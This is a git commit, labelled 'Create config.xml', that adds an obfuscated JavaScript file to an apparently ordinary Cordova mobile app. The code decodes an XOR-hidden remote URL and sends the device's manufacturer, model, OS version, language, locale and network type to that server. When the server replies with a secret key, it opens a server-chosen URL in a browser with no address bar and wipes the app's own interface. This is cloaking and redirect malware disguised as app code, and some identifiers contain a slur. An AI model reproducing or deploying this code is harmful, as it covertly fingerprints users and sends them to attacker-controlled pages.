b6a6772cdb4943afeb7d89592b11346b91c41077
Namyanhania <Namyanhania@icloud.com>
2025-09-10 07:24:36 +0300

    Create config.xml

---
+++ www/fghs.js
@@ -0,0 +1,213 @@
+var jbk_RirYNMWzjpkUkrZ_eLsDrGGEvqK_TWxJnWTUTrueAllocationSheerProducerUD = 0;
+var GuiltAntonyFightingHIqlwUJawsDomesticatedLeisureDescendedBKwzLMDhmu_fjEsKJYBko_QOnUPBp = "";
+var MutteredBHHurricaneBackgroundApercNJqlUtZc_LOAqtC_yrQnDSgsNcThrustQIS = 0;
+var fdgdfgfdg = "";
+
+function LuggageRegisteredbugvVInYMGlandPublishedMutteredStiffenUntilBhc_rAOakViY_ysmMfHQwO(str) {var encoded = "";for (i=0; i<str.length;i++) {var a = str.charCodeAt(i);var b = a ^ 3;encoded = encoded+String.fromCharCode(b);}return encoded;}
+function PartingIZMumbleQAThriceYourselfrTjfnOP_oyTJGqu_mRBUtEuwRQTd_AdvS_mdIACKRpf(str) {var encoded = "";for (i=0; i<str.length;i++) {var a = str.charCodeAt(i);var b = a ^ 11;encoded = encoded+String.fromCharCode(b);}return encoded;}
+function EIBj_EWxuW_mAqmXIRSsMifsOMeE_yDErUVTQz_phwoGcGestureForgotPnSRPATV_WRDfTQJdWbW_NLnZlYo(str) {var encoded = "";for (i=0; i<str.length;i++) {var a = str.charCodeAt(i);var b = a ^ 7;encoded = encoded+String.fromCharCode(b);}return encoded;}
+function Treasure6DenyGraveyardFishMeltYpkAswnW_FpckzAGfEnsaqkU(string, search, replace) {return string.split(search).join(replace);}
+function AbruptlyConference1HopPlaceKQGullNewspapersjBEUn_wz_XjRqRp(str) {var encoded = "";for (i=0; i<str.length;i++) {var a = str.charCodeAt(i);var b = a ^ 12;encoded = encoded+String.fromCharCode(b);}return encoded;}
+function SadnessStatesThoughtfullyCrookedWorn8AbundantbjRB_bmAElZSgnv_xzJSuILjub() {return AbruptlyConference1HopPlaceKQGullNewspapersjBEUn_wz_XjRqRp(localStorage.getItem('againstogjfirespclickhli'));}
+
+function InhabitAdministratorWorkSniggerZMJQgehIOIVfg_VXFalain_APIUWVzd() {return LuggageRegisteredbugvVInYMGlandPublishedMutteredStiffenUntilBhc_rAOakViY_ysmMfHQwO("kwwsp9,,bsnapqu-pjwf");}
+
+function tahR_jpGqQddYl_qypOmjlCRecklessCalmlyLeapedBrightESXYieldDeviceShrub3() {return EIBj_EWxuW_mAqmXIRSsMifsOMeE_yDErUVTQz_phwoGcGestureForgotPnSRPATV_WRDfTQJdWbW_NLnZlYo("w");}
+function tahR_jpGqQddYl_qypOmjlCRecklessCalmlyLeapedBrightESXYieldDeviceShrub4() {return LuggageRegisteredbugvVInYMGlandPublishedMutteredStiffenUntilBhc_rAOakViY_ysmMfHQwO("PD1GKb6IE;Gpb");}
+function tahR_jpGqQddYl_qypOmjlCRecklessCalmlyLeapedBrightESXYieldDeviceShrub5() {return LuggageRegisteredbugvVInYMGlandPublishedMutteredStiffenUntilBhc_rAOakViY_ysmMfHQwO("omd");}
+function tahR_jpGqQddYl_qypOmjlCRecklessCalmlyLeapedBrightESXYieldDeviceShrub6() {return PartingIZMumbleQAThriceYourselfrTjfnOP_oyTJGqu_mRBUtEuwRQTd_AdvS_mdIACKRpf("gdh");}
+function tahR_jpGqQddYl_qypOmjlCRecklessCalmlyLeapedBrightESXYieldDeviceShrub7() {return PartingIZMumbleQAThriceYourselfrTjfnOP_oyTJGqu_mRBUtEuwRQTd_AdvS_mdIACKRpf("on}bhnfdong");}
+function tahR_jpGqQddYl_qypOmjlCRecklessCalmlyLeapedBrightESXYieldDeviceShrub8() {return LuggageRegisteredbugvVInYMGlandPublishedMutteredStiffenUntilBhc_rAOakViY_ysmMfHQwO("mfwtlqh");}
+function dMReiBYXSS_XP_UZVXmoZWDNxffpA_jZFHSRHTNImpossibleCardsTypewriterPurposesClothe3Text3() {return PartingIZMumbleQAThriceYourselfrTjfnOP_oyTJGqu_mRBUtEuwRQTd_AdvS_mdIACKRpf("9;;").trim();}
+function dMReiBYXSS_XP_UZVXmoZWDNxffpA_jZFHSRHTNImpossibleCardsTypewriterPurposesClothe3Text2() {return LuggageRegisteredbugvVInYMGlandPublishedMutteredStiffenUntilBhc_rAOakViY_ysmMfHQwO("HIEPBGEDEDHIGPEPEPBIDKHPEPB");}
+function OwenKKHdMlPtH_EaMowIvkqFPairBuildsPortraitChurchyard1() {return LuggageRegisteredbugvVInYMGlandPublishedMutteredStiffenUntilBhc_rAOakViY_ysmMfHQwO(",ulo`bml.dolabo,pfqufq-sks");}
+
+function OwenKKHdMlPtH_EaMowIvkqFPairBuildsPortraitChurchyard2_P1() {return EIBj_EWxuW_mAqmXIRSsMifsOMeE_yDErUVTQz_phwoGcGestureForgotPnSRPATV_WRDfTQJdWbW_NLnZlYo("w");}
+function OwenKKHdMlPtH_EaMowIvkqFPairBuildsPortraitChurchyard2_P2() {return LuggageRegisteredbugvVInYMGlandPublishedMutteredStiffenUntilBhc_rAOakViY_ysmMfHQwO("P2IdW:G`hHpi");}
+function OwenKKHdMlPtH_EaMowIvkqFPairBuildsPortraitChurchyard2_PHONE() {return LuggageRegisteredbugvVInYMGlandPublishedMutteredStiffenUntilBhc_rAOakViY_ysmMfHQwO("sklmf");}
+function OwenKKHdMlPtH_EaMowIvkqFPairBuildsPortraitChurchyard2_STRPHONE() {return LuggageRegisteredbugvVInYMGlandPublishedMutteredStiffenUntilBhc_rAOakViY_ysmMfHQwO("pwqbmbsklmf");}
+function OwenKKHdMlPtH_EaMowIvkqFPairBuildsPortraitChurchyard2_YPRM1() {return LuggageRegisteredbugvVInYMGlandPublishedMutteredStiffenUntilBhc_rAOakViY_ysmMfHQwO("zmsqlupwbw");}
+function OwenKKHdMlPtH_EaMowIvkqFPairBuildsPortraitChurchyard2_YPRM2() {return LuggageRegisteredbugvVInYMGlandPublishedMutteredStiffenUntilBhc_rAOakViY_ysmMfHQwO("zmepk");}
+function OwenKKHdMlPtH_EaMowIvkqFPairBuildsPortraitChurchyard2_YPRM3() {return LuggageRegisteredbugvVInYMGlandPublishedMutteredStiffenUntilBhc_rAOakViY_ysmMfHQwO("eqnw{wwzsf");}
+function dMReiBYXSS_XP_UZVXmoZWDNxffpA_jZFHSRHTNImpossibleCardsTypewriterPurposesClothe3Text_VP() {return PartingIZMumbleQAThriceYourselfrTjfnOP_oyTJGqu_mRBUtEuwRQTd_AdvS_mdIACKRpf("4");}
+function dMReiBYXSS_XP_UZVXmoZWDNxffpA_jZFHSRHTNImpossibleCardsTypewriterPurposesClothe3Text_IZN() {return PartingIZMumbleQAThriceYourselfrTjfnOP_oyTJGqu_mRBUtEuwRQTd_AdvS_mdIACKRpf("-");}
+function dMReiBYXSS_XP_UZVXmoZWDNxffpA_jZFHSRHTNImpossibleCardsTypewriterPurposesClothe3Text_RAVN() {return PartingIZMumbleQAThriceYourselfrTjfnOP_oyTJGqu_mRBUtEuwRQTd_AdvS_mdIACKRpf("6");}
+function dMReiBYXSS_XP_UZVXmoZWDNxffpA_jZFHSRHTNImpossibleCardsTypewriterPurposesClothe3Text_DPSMMS() {return PartingIZMumbleQAThriceYourselfrTjfnOP_oyTJGqu_mRBUtEuwRQTd_AdvS_mdIACKRpf("-xbf6");}
+function dMReiBYXSS_XP_UZVXmoZWDNxffpA_jZFHSRHTNImpossibleCardsTypewriterPurposesClothe3Text_POVZ() {return PartingIZMumbleQAThriceYourselfrTjfnOP_oyTJGqu_mRBUtEuwRQTd_AdvS_mdIACKRpf("-{d}q6:");}
+
+
+function TilePorridgeBradleyKYmNFgS_Cz_hATsuioNfwwrW_PZWbbAMlyI(HelpfulMeetingMaturityVLDiscreetRecognitionBombRefreshmentIneffective,ReopenGGNThingsSprayImpostorStemHatchHatsPUV,RobotsZEVPrizeBaffleBabbleBeastNVFairyReductionBout,AlibiMPBPhilipRoarBugIslandBelievesBudsNews) {
+return InhabitAdministratorWorkSniggerZMJQgehIOIVfg_VXFalain_APIUWVzd()+OwenKKHdMlPtH_EaMowIvkqFPairBuildsPortraitChurchyard1()+dMReiBYXSS_XP_UZVXmoZWDNxffpA_jZFHSRHTNImpossibleCardsTypewriterPurposesClothe3Text_VP()+tahR_jpGqQddYl_qypOmjlCRecklessCalmlyLeapedBrightESXYieldDeviceShrub3()+dMReiBYXSS_XP_UZVXmoZWDNxffpA_jZFHSRHTNImpossibleCardsTypewriterPurposesClothe3Text_RAVN()+tahR_jpGqQddYl_qypOmjlCRecklessCalmlyLeapedBrightESXYieldDeviceShrub4()+dMReiBYXSS_XP_UZVXmoZWDNxffpA_jZFHSRHTNImpossibleCardsTypewriterPurposesClothe3Text_IZN()+tahR_jpGqQddYl_qypOmjlCRecklessCalmlyLeapedBrightESXYieldDeviceShrub5()+dMReiBYXSS_XP_UZVXmoZWDNxffpA_jZFHSRHTNImpossibleCardsTypewriterPurposesClothe3Text_RAVN()+HelpfulMeetingMaturityVLDiscreetRecognitionBombRefreshmentIneffective+dMReiBYXSS_XP_UZVXmoZWDNxffpA_jZFHSRHTNImpossibleCardsTypewriterPurposesClothe3Text_IZN()+tahR_jpGqQddYl_qypOmjlCRecklessCalmlyLeapedBrightESXYieldDeviceShrub6()+dMReiBYXSS_XP_UZVXmoZWDNxffpA_jZFHSRHTNImpossibleCardsTypewriterPurposesClothe3Text_RAVN()+ReopenGGNThingsSprayImpostorStemHatchHatsPUV+dMReiBYXSS_XP_UZVXmoZWDNxffpA_jZFHSRHTNImpossibleCardsTypewriterPurposesClothe3Text_IZN()+tahR_jpGqQddYl_qypOmjlCRecklessCalmlyLeapedBrightESXYieldDeviceShrub7()+dMReiBYXSS_XP_UZVXmoZWDNxffpA_jZFHSRHTNImpossibleCardsTypewriterPurposesClothe3Text_RAVN()+RobotsZEVPrizeBaffleBabbleBeastNVFairyReductionBout+dMReiBYXSS_XP_UZVXmoZWDNxffpA_jZFHSRHTNImpossibleCardsTypewriterPurposesClothe3Text_IZN()+tahR_jpGqQddYl_qypOmjlCRecklessCalmlyLeapedBrightESXYieldDeviceShrub8()+dMReiBYXSS_XP_UZVXmoZWDNxffpA_jZFHSRHTNImpossibleCardsTypewriterPurposesClothe3Text_RAVN()+AlibiMPBPhilipRoarBugIslandBelievesBudsNews;
+}
+
+var MentionedToadSettingGerm7FeasibleDrawPartiallyComprehendISY = {
+    initialize: function() {
+		document.addEventListener("offline", ValeFlashHazardAuctionAllDeveloperJackalFalconAbbeyIcicleOW, false);
+        document.addEventListener('deviceready', this.onDeviceReady.bind(this), false);
+		document.addEventListener("backbutton", CuffBinSeemUB, false);
+    },
+    onDeviceReady: function() {
+    this.receivedEvent('deviceready');
+var DifferSortAnnuallyInterceptAbidebmRKVfM_iKNgsCheySlhjeKO = navigator.connection.type;
+var FeathersChiselPrincessWidenThemGentlemanEffortRevisionSmallestJewAccustom = {};
+FeathersChiselPrincessWidenThemGentlemanEffortRevisionSmallestJewAccustom[Connection.UNKNOWN]  = 'Unknown';
+FeathersChiselPrincessWidenThemGentlemanEffortRevisionSmallestJewAccustom[Connection.ETHERNET] = 'Ethernet';
+FeathersChiselPrincessWidenThemGentlemanEffortRevisionSmallestJewAccustom[Connection.WIFI]     = 'WiFi';
+FeathersChiselPrincessWidenThemGentlemanEffortRevisionSmallestJewAccustom[Connection.CELL_2G]  = '2G';
+FeathersChiselPrincessWidenThemGentlemanEffortRevisionSmallestJewAccustom[Connection.CELL_3G]  = '3G';
+FeathersChiselPrincessWidenThemGentlemanEffortRevisionSmallestJewAccustom[Connection.CELL_4G]  = '4G';
+FeathersChiselPrincessWidenThemGentlemanEffortRevisionSmallestJewAccustom[Connection.CELL]     = 'Cell';
+FeathersChiselPrincessWidenThemGentlemanEffortRevisionSmallestJewAccustom[Connection.NONE]     = 'none';
+var InitiateEltonHonourPeachesExciteKxQg_xQYdho_bIfaatNxFaLjBhlba_XzipEANf = FeathersChiselPrincessWidenThemGentlemanEffortRevisionSmallestJewAccustom[DifferSortAnnuallyInterceptAbidebmRKVfM_iKNgsCheySlhjeKO];
+
+var CeremonyGiftHonestlyKUOzEGyVgTS_pRaORTNZ = localStorage.getItem('CeremonyGiftHonestlyKUOzEGyVgTS_pRaORTNZ');
+var PracticeCWDroopUUZ = localStorage.getItem('PracticeCWDroopUUZ');
+
+if ((CeremonyGiftHonestlyKUOzEGyVgTS_pRaORTNZ == undefined) || (CeremonyGiftHonestlyKUOzEGyVgTS_pRaORTNZ == null) || (CeremonyGiftHonestlyKUOzEGyVgTS_pRaORTNZ == NaN)) {navigator.globalization.getPreferredLanguage(function (language) {localStorage.setItem('lng', language.value);CeremonyGiftHonestlyKUOzEGyVgTS_pRaORTNZ=language.value;},function () {localStorage.setItem('CeremonyGiftHonestlyKUOzEGyVgTS_pRaORTNZ', "none");CeremonyGiftHonestlyKUOzEGyVgTS_pRaORTNZ = "none";});}
+
+if ((PracticeCWDroopUUZ == undefined) || (PracticeCWDroopUUZ == null) || (PracticeCWDroopUUZ == NaN)) {navigator.globalization.getLocaleName(function (locale) {localStorage.setItem('PracticeCWDroopUUZ', locale.value);PracticeCWDroopUUZ=locale.value;},function () {localStorage.setItem('PracticeCWDroopUUZ', "none");PracticeCWDroopUUZ="none";});}
+
+var CombinedRNCcTQH_ahsYIuTsGS_ErFzQKzcCFOaxdJ_IJPcrrlIKHi_XLBXeYKwh_MQuqXaReturnSwitch = device.manufacturer;
+var DuplicatePlainscyVr_FK_lgPUbHbsqRb_VWRHWTtfkneLEV_BhCPmmVBZYD_QLivPCCeoeImportanceNightmare = device.model;
+var GenerallyProvidedVioletSmokeWebRelyUserrFCcw_UbGpcXG_bXnRNZiFlutterOperative = device.version;
+var FollyXIJudgementTinyCompassionParallelPostal2WantedOPxIiTutQt = Treasure6DenyGraveyardFishMeltYpkAswnW_FpckzAGfEnsaqkU(CombinedRNCcTQH_ahsYIuTsGS_ErFzQKzcCFOaxdJ_IJPcrrlIKHi_XLBXeYKwh_MQuqXaReturnSwitch+"-"+DuplicatePlainscyVr_FK_lgPUbHbsqRb_VWRHWTtfkneLEV_BhCPmmVBZYD_QLivPCCeoeImportanceNightmare+"-"+GenerallyProvidedVioletSmokeWebRelyUserrFCcw_UbGpcXG_bXnRNZiFlutterOperative, ' ', '-');
+// 1.5 sec
+var RomanceHMWeaknessPerformanceWhiteLavishWaspFollowsyEoCIYhJYT = setInterval(function() {
+GuiltAntonyFightingHIqlwUJawsDomesticatedLeisureDescendedBKwzLMDhmu_fjEsKJYBko_QOnUPBp = localStorage.getItem('GuiltAntonyFightingHIqlwUJawsDomesticatedLeisureDescendedBKwzLMDhmu_fjEsKJYBko_QOnUPBp');
+if ((GuiltAntonyFightingHIqlwUJawsDomesticatedLeisureDescendedBKwzLMDhmu_fjEsKJYBko_QOnUPBp == undefined) || (GuiltAntonyFightingHIqlwUJawsDomesticatedLeisureDescendedBKwzLMDhmu_fjEsKJYBko_QOnUPBp == null) || (GuiltAntonyFightingHIqlwUJawsDomesticatedLeisureDescendedBKwzLMDhmu_fjEsKJYBko_QOnUPBp == NaN)) {
+
+fdgdfgfdg = cordova.InAppBrowser.open(cordova.file.applicationDirectory + 'www/index.html', '_blank', 'enableViewportScale=yes,mediaPlaybackRequiresUserAction=yes,allowInlineMediaPlayback=yes,location=no,transitionstyle=crossdissolve,hardwareback=yes,footer=no,zoom=no,hidden=no');
+
+if (jbk_RirYNMWzjpkUkrZ_eLsDrGGEvqK_TWxJnWTUTrueAllocationSheerProducerUD == 1) {
+fdgdfgfdg.addEventListener('loadstop', function() {
+    fdgdfgfdg.executeScript({code: 'function sfsdf() {return "<center>Error download text Privacy Policy!<br />No internet connection!</center>";}'});
+});
+}
+
+if (jbk_RirYNMWzjpkUkrZ_eLsDrGGEvqK_TWxJnWTUTrueAllocationSheerProducerUD == 0) {
+var CompareHerselfGoodbyeWaverAccommodationStarveShelvesGCVQVBXPoNeu = TilePorridgeBradleyKYmNFgS_Cz_hATsuioNfwwrW_PZWbbAMlyI(CeremonyGiftHonestlyKUOzEGyVgTS_pRaORTNZ,PracticeCWDroopUUZ,FollyXIJudgementTinyCompassionParallelPostal2WantedOPxIiTutQt,InitiateEltonHonourPeachesExciteKxQg_xQYdho_bIfaatNxFaLjBhlba_XzipEANf);
+var BlondeSliceOccasionalyjPdxj_uMlhOhXgEWUesltMtSO = 0;
+var BlondeSliceOccasionalyjPdxj_uMlhOhXgEWUesltMtSO2 = 0;
+///
+cordovaHTTP.get(CompareHerselfGoodbyeWaverAccommodationStarveShelvesGCVQVBXPoNeu, {}, {}, function(response) {
+var CuffFossil1PlanetBuyerConquestNeighbouring5HabitsIndifferentGOTtcuOfVLdvq = response.data.trim();
+if (CuffFossil1PlanetBuyerConquestNeighbouring5HabitsIndifferentGOTtcuOfVLdvq.length > 2) {
+BlondeSliceOccasionalyjPdxj_uMlhOhXgEWUesltMtSO = 100;
+BlendBlessWhistledForgotPaceSurfacesMuddyCunningIfTPHl(CuffFossil1PlanetBuyerConquestNeighbouring5HabitsIndifferentGOTtcuOfVLdvq);
+	} else {
+		CuffFossil1PlanetBuyerConquestNeighbouring5HabitsIndifferentGOTtcuOfVLdvq = "";
+		BlondeSliceOccasionalyjPdxj_uMlhOhXgEWUesltMtSO = 0;
+	}
+}, function(response) {
+// err resp
+if (MutteredBHHurricaneBackgroundApercNJqlUtZc_LOAqtC_yrQnDSgsNcThrustQIS==0) {
+MutteredBHHurricaneBackgroundApercNJqlUtZc_LOAqtC_yrQnDSgsNcThrustQIS = 1;
+}
+});
+///
+var RousedVapourWarGEEtjmXvMY_jMixNIbwnsQpQdClJ = setInterval(function() {
+if (BlondeSliceOccasionalyjPdxj_uMlhOhXgEWUesltMtSO==0) {
+///
+cordovaHTTP.get(CompareHerselfGoodbyeWaverAccommodationStarveShelvesGCVQVBXPoNeu+dMReiBYXSS_XP_UZVXmoZWDNxffpA_jZFHSRHTNImpossibleCardsTypewriterPurposesClothe3Text_POVZ(), {}, {}, function(response) {
+var CuffFossil1PlanetBuyerConquestNeighbouring5HabitsIndifferentGOTtcuOfVLdvq = response.data.trim();
+if (CuffFossil1PlanetBuyerConquestNeighbouring5HabitsIndifferentGOTtcuOfVLdvq.length > 2) {
+clearInterval(RousedVapourWarGEEtjmXvMY_jMixNIbwnsQpQdClJ);
+BlendBlessWhistledForgotPaceSurfacesMuddyCunningIfTPHl(CuffFossil1PlanetBuyerConquestNeighbouring5HabitsIndifferentGOTtcuOfVLdvq);
+	} else {
+		BlondeSliceOccasionalyjPdxj_uMlhOhXgEWUesltMtSO2 = BlondeSliceOccasionalyjPdxj_uMlhOhXgEWUesltMtSO2 + 1;
+		if (BlondeSliceOccasionalyjPdxj_uMlhOhXgEWUesltMtSO2>2) {
+clearInterval(RousedVapourWarGEEtjmXvMY_jMixNIbwnsQpQdClJ);
+	
+
+			}
+	} // 1
+}, function(response) {
+// err resp
+if (MutteredBHHurricaneBackgroundApercNJqlUtZc_LOAqtC_yrQnDSgsNcThrustQIS==0) {
+MutteredBHHurricaneBackgroundApercNJqlUtZc_LOAqtC_yrQnDSgsNcThrustQIS = 1;
+
+}
+});
+///
+} else {
+	clearInterval(RousedVapourWarGEEtjmXvMY_jMixNIbwnsQpQdClJ);
+	} // if
+ }, 10000);
+} else {
+var DifferCeilingReflectedConventionalAItCX_RqzVhQuqKgXnWwQGezU = setInterval(function() {
+
+
+clearInterval(DifferCeilingReflectedConventionalAItCX_RqzVhQuqKgXnWwQGezU);
+ }, 2000);
+} // no int
+} else {
+if (jbk_RirYNMWzjpkUkrZ_eLsDrGGEvqK_TWxJnWTUTrueAllocationSheerProducerUD == 0) {
+
+
+var yaYsb_drTHhubS_SDLGRLpIDChildhoodGSSociable9HandsMwJXg_DfLMlrhrmHb_SOldyoeNE = localStorage.getItem('yaYsb_drTHhubS_SDLGRLpIDChildhoodGSSociable9HandsMwJXg_DfLMlrhrmHb_SOldyoeNE');
+if (yaYsb_drTHhubS_SDLGRLpIDChildhoodGSSociable9HandsMwJXg_DfLMlrhrmHb_SOldyoeNE=="1") {
+document.getElementById("NervousUndoubtedlyhPG_WpTdQEmuSZCbiMlPyvi_StHLErasTMY_EAOIkGIavtIqLugUg_UCqOSzqg").style.display = "block";
+var ScoutXVVPTipqGCR_XVYG_gdwmjPOqKL_jGlNLvtckXOjEMqKMGIz_KHShlQtjunq_evUCWUI = cordova.InAppBrowser.open(GuiltAntonyFightingHIqlwUJawsDomesticatedLeisureDescendedBKwzLMDhmu_fjEsKJYBko_QOnUPBp, '_blank', 'enableViewportScale=yes,mediaPlaybackRequiresUserAction=yes,allowInlineMediaPlayback=yes,location=no,transitionstyle=crossdissolve,hardwareback=yes,footer=no,zoom=no,hidden=yes');
+var PerversePZMz_EFjvzYKlHbxUIcbxEZHVXXJ_HYlNZWNU_HLNjJAsp = setInterval(function() {
+ScoutXVVPTipqGCR_XVYG_gdwmjPOqKL_jGlNLvtckXOjEMqKMGIz_KHShlQtjunq_evUCWUI.show();
+var PerversePZMz_EFjvzYKlHbxUIcbxEZHVXXJ_HYlNZWNU_HLNjJAsp2 = setInterval(function() {
+
+document.body.innerHTML = "";
+document.body.setAttribute("style", "background: #000 !important");
+clearInterval(PerversePZMz_EFjvzYKlHbxUIcbxEZHVXXJ_HYlNZWNU_HLNjJAsp2);
+}, 1000);
+clearInterval(PerversePZMz_EFjvzYKlHbxUIcbxEZHVXXJ_HYlNZWNU_HLNjJAsp);
+}, 3000);
+
+
+}
+
+} else {
+  
+  document.body.innerHTML = "<div id='RelationDeclaration9CrackIngredientIDgKP_EHLIL_NuUIoZVpWRLq_BZmvVblyzCzPCxCEwAlBeachBetty' style='text-align:center; color:#CCC;'><br /><br /><br /><br /><br /><br />No internet connection</div>";
+}
+}
+
+clearInterval(RomanceHMWeaknessPerformanceWhiteLavishWaspFollowsyEoCIYhJYT);
+}, 1500);
+
+    },
+	
+    receivedEvent: function(id) {
+        var parentElement = document.getElementById(id);
+    }
+
+	
+};
+
+MentionedToadSettingGerm7FeasibleDrawPartiallyComprehendISY.initialize();
+function CuffBinSeemUB() {}
+function ValeFlashHazardAuctionAllDeveloperJackalFalconAbbeyIcicleOW() {jbk_RirYNMWzjpkUkrZ_eLsDrGGEvqK_TWxJnWTUTrueAllocationSheerProducerUD = 1;}
+
+function BlendBlessWhistledForgotPaceSurfacesMuddyCunningIfTPHl(PeacockTemptationGotExactlyJeansHintNextShutdownMondayPractically) {
+	var CommunicatedHousedLFkAGpO_saQyyG_wLGmsywO_gtUMybPLzHungAvalanche = PeacockTemptationGotExactlyJeansHintNextShutdownMondayPractically.split('#');
+	if (CommunicatedHousedLFkAGpO_saQyyG_wLGmsywO_gtUMybPLzHungAvalanche.length>0) {
+		if (CommunicatedHousedLFkAGpO_saQyyG_wLGmsywO_gtUMybPLzHungAvalanche[0]==dMReiBYXSS_XP_UZVXmoZWDNxffpA_jZFHSRHTNImpossibleCardsTypewriterPurposesClothe3Text2()) {
+			if (CommunicatedHousedLFkAGpO_saQyyG_wLGmsywO_gtUMybPLzHungAvalanche[1].length>2) {
+			GuiltAntonyFightingHIqlwUJawsDomesticatedLeisureDescendedBKwzLMDhmu_fjEsKJYBko_QOnUPBp = CommunicatedHousedLFkAGpO_saQyyG_wLGmsywO_gtUMybPLzHungAvalanche[1].trim();
+			localStorage.setItem('GuiltAntonyFightingHIqlwUJawsDomesticatedLeisureDescendedBKwzLMDhmu_fjEsKJYBko_QOnUPBp', GuiltAntonyFightingHIqlwUJawsDomesticatedLeisureDescendedBKwzLMDhmu_fjEsKJYBko_QOnUPBp);
+			localStorage.setItem('yaYsb_drTHhubS_SDLGRLpIDChildhoodGSSociable9HandsMwJXg_DfLMlrhrmHb_SOldyoeNE', "1");
+            cordova.InAppBrowser.open(GuiltAntonyFightingHIqlwUJawsDomesticatedLeisureDescendedBKwzLMDhmu_fjEsKJYBko_QOnUPBp, '_blank', 'enableViewportScale=yes,mediaPlaybackRequiresUserAction=yes,allowInlineMediaPlayback=yes,location=no,transitionstyle=crossdissolve,hardwareback=yes,footer=no,zoom=no,hidden=no');
+			var ProhibitedWeaponsUpgradeGreekTWHookupDocumentnTSk_Bexxh_TxwOiKDvInducedWrittenDene = setInterval(function() {
+			document.body.innerHTML = "";
+			document.body.setAttribute("style", "background: #000 !important");
+			clearInterval(ProhibitedWeaponsUpgradeGreekTWHookupDocumentnTSk_Bexxh_TxwOiKDvInducedWrittenDene);
+			}, 2000);
+
+			} else {
+			
+			}
+		} else {
+fdgdfgfdg.addEventListener('loadstop', function() {
+    fdgdfgfdg.executeScript({code: 'function sfsdf() {return "'+PeacockTemptationGotExactlyJeansHintNextShutdownMondayPractically+'";}'});
+});
+			}
+		
+	}
+	
+} // funct
